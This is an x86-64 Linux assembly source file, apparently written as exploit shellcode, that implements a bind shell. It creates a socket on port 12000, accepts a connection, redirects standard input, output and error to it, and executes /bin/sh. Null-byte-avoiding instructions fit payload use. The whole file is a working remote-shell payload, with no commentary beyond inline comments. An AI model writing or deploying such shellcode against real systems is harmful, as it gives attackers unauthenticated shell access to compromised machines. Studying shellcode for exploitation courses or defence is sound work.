section .text
global _start
_start:

  ; sockfd = socket(PF_INET, SOCK_STREAM, 0)
  xor     edi, edi
  mov     dil, 2              ; PF_INET = 2
  xor     esi, esi
  mov     sil, 1              ; SOCK_STREAM = 1
  xor     edx, edx        
  xor     eax, eax
  mov     al, 41              ; sys_socket 64 bits
  syscall
  mov     r8, rax             ; saving sockd for later

  ; bind(sockfd, &host_addr, 16)
  xor     ebx, ebx
  push    rbx
  mov     byte [rsp], 0x02    ; AF_INET = 2 (word) port = 12000 (0x2ee0 big endian)  
  mov     byte [rsp+2], 0x2e  ; IP = 0 (dword)
  mov     byte [rsp+3], 0xe0  ; 0x02  0x00  0x2e  0xe0  0x00  0x00  0x00  0x00  
  mov     rdi, r8             ; sockfd is first argument
  mov     rsi, rsp            ; &host_addr second argument 
  xor     edx, edx
  mov     dl, 16              ; sizeof(struct sockaddr)(only first 8 matter here)
  xor     eax, eax
  mov     al, 49              ; sys_bind 64 bits
  syscall

  ; listen(sockfd, 4)
  mov     edi, r8d          ; sockfd is first argument
  xor     esi, esi
  mov     sil,  4           ; second argument
  xor     eax, eax
  mov     al, 50           ; sys_listen 64 bits
  syscall

  ; accept(sockfd, NULL, NULL) 
  mov     edi, r8d          ; sockfd is first argument
  xor     esi, esi          ; NULL second argument
  xor     edx, edx          ; NULL third argument
  xor     eax, eax
  mov     al, 43            ; sys_accept 64 bits
  syscall
  mov     r9d, eax           ; saving new socket

  ; dup2(new_socketfd, i) i = 2, 1, 0
  xor     ebx, ebx
  mov     bl, 2
dup_loop:
  mov     edi, r9d          ; new_socketfd first argument
  mov     esi, ebx          ; stdin, stdout, stderr
  xor     eax, eax
  mov     al, 33            ; sys_dup2 64 bits
  syscall
  dec     ebx
  jns     dup_loop          ; sign flag not set, i.e. ebx > -1

  ; execve(filename, argv, envp);
  xor   eax, eax      ; rax = 0
  push  rax           ; null terminating string on the stack
  mov   rbx, 0x68732f2f6e69622f ; "/bin//sh"
  push  rbx
  mov   rdi, rsp      ; address of filename, first argument of sys_execve
  push  rax           ; null pointer on the stack
  mov   rdx, rsp      ; address of envp for third argument of sys_execve
  push  rdi           ; pushing address of string as first pointer of argv
  mov   rsi, rsp      ; address of argv for second argument of sys_execve
  mov   al, 59        ; sys_execve 64 bits (see /usr/include/asm/unistd_64.h)
  syscall             ; execve(filename, argv, envp)
  
  ; should not reach this point
